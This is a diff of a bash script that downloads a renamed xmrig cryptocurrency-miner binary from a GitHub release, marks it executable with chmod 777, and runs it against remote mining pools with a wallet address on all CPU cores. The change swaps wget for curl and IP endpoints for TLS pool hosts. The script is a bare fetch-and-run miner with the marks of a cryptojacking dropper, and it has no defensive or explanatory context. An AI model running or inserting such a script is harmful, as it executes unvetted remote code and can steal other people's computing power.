@@ -1,5 +1,5 @@
 #!/bin/bash
-wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
+curl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl -L -o vrl
 chmod 777 vrl
-./vrl -o 51.158.160.33:8080 -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.x -p webpassword=x -k -a randomvirel \
-  -o 51.158.126.197:8080 -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.x -p webpassword=x -k -a randomvirel -t $(nproc --all)
+./vrl --url eu.rplant.xyz:17155 --tls -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.x -p webpassword=x -k -a randomvirel \
+  --url na.rplant.xyz:17155 --tls -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.x -p webpassword=x -k -a randomvirel -t $(nproc --all)
